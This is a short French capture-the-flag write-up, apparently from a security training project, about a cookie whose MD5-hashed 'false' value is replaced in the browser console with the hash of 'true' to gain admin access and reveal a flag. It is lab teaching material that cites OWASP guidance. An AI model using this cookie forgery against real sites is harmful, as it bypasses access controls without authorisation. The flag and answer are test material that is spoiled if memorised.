# COOKIE SESSION

## Flag
```
df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3
```

## Découverte

Lorsqu'on regarde les cookies enregistré par le site dans la console voici ce \
qui en ressort :

```diff
document.cookie
> "I_am_admin=68934a3e9455fa72420237eb05902327"
```
68934a3e9455fa72420237eb05902327 est crypté en md5 et signifie "false". \
Essayons donc avec "true".

```
68934a3e9455fa72420237eb05902327 -> "false"
"true" -> b326b5062b2f0e69046810717534cb09
```

```
document.cookie="I_am_admin=b326b5062b2f0e69046810717534cb09"
```

Lorsqu'on rafraichit la page bingo, une alerte avec le flag !



## Documentation
- [owasp - Session Management](https://owasp.org/www-project-cheat-sheets/cheatsheets/Session_Management_Cheat_Sheet.html)

---

[RETURN](https://github.com/jlange91/darkly)
